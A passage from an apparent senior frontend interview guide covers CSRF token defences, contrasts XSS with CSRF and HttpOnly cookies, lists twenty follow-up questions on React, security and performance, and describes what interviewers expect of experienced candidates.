For a state-changing request, the frontend also sends a CSRF token:

```http
POST /transfer
Cookie: session=abc123
X-CSRF-Token: xyz789
```

The server verifies both.

A malicious site may be able to cause the browser to send the cookie, but it shouldn't know the required CSRF token.

Other important defenses include appropriate **`SameSite` cookie settings**, origin checks, and framework-specific CSRF protections.

### The interview distinction

| Attack   | What attacker wants                                       | HttpOnly helps? |
| -------- | --------------------------------------------------------- | --------------- |
| **XSS**  | Read/steal the cookie using JavaScript                    | ✅ Yes           |
| **CSRF** | Make the victim's browser perform an authenticated action | ❌ Not by itself |

### Senior-level answer

> **"HttpOnly prevents JavaScript from reading the authentication cookie, so it significantly reduces the impact of cookie theft through XSS. However, HttpOnly doesn't stop the browser from automatically attaching the cookie to requests. Therefore, an attacker can potentially trigger authenticated state-changing requests through CSRF without ever reading the cookie. CSRF tokens, appropriate SameSite settings, and origin validation are used as additional defenses."**

That's the key distinction:

**XSS tries to steal/use the credential; CSRF tries to abuse the browser's automatic use of the credential.**


---

# High-Difficulty Follow-Up Questions

These are questions I would ask in a real senior interview after the above answers:

1. Why can `React.memo` sometimes make performance worse?
2. When would `useMemo` actually be harmful?
3. How would you prevent tearing or inconsistent reads from external stores?
4. How does concurrent rendering change the way you reason about React updates?
5. How would you design a frontend permission model for 100+ permissions?
6. How would you securely handle refresh-token rotation?
7. Why is `localStorage` risky for authentication tokens?
8. How would you prevent race conditions between multiple API requests?
9. How would you design stale-while-revalidate caching?
10. How would you diagnose a memory leak that happens only after 30 minutes?
11. How would you reduce INP on a page containing a large data grid?
12. How would you design an accessible autocomplete component?
13. How would you handle focus management in a SPA?
14. How would you prevent a third-party script from compromising your application?
15. How would you implement CSP for a React application?
16. How would you debug a production-only hydration mismatch?
17. How would you decide whether a feature belongs in Redux?
18. How would you design frontend observability without leaking PII?
19. How would you implement feature flags safely?
20. What would you do if the backend API is consistently slower than the frontend SLA?

# What I Would Expect From a 6+ Year Senior Candidate

At this level, I would not evaluate only whether you know React APIs.

I would expect you to demonstrate:

- Strong JavaScript fundamentals.
- Deep React rendering knowledge.
- TypeScript design ability.
- Accessibility awareness.
- Security fundamentals.
- Authentication and authorization understanding.
- Performance investigation skills.
- Production debugging experience.
- API/network understanding.
- Testing strategy.
- Architectural decision-making.
- Ability to explain trade-offs.
- Ability to identify when **not** to over-engineer.

The strongest senior answers usually follow this structure:

> **Problem → Diagnosis → Options → Trade-offs → Decision → Implementation → Measurement**

For example, instead of saying:

> "I will use `useMemo` to improve performance."

A stronger answer is:

> "First I would profile the component and confirm that an expensive calculation is contributing to render time. If it is, I would memoize that calculation, verify the dependency list, and measure the render improvement. If the calculation is cheap, I would avoid `useMemo` because the memoization itself adds complexity and overhead."

That distinction is what separates an experienced React developer from someone who mainly knows the APIs.
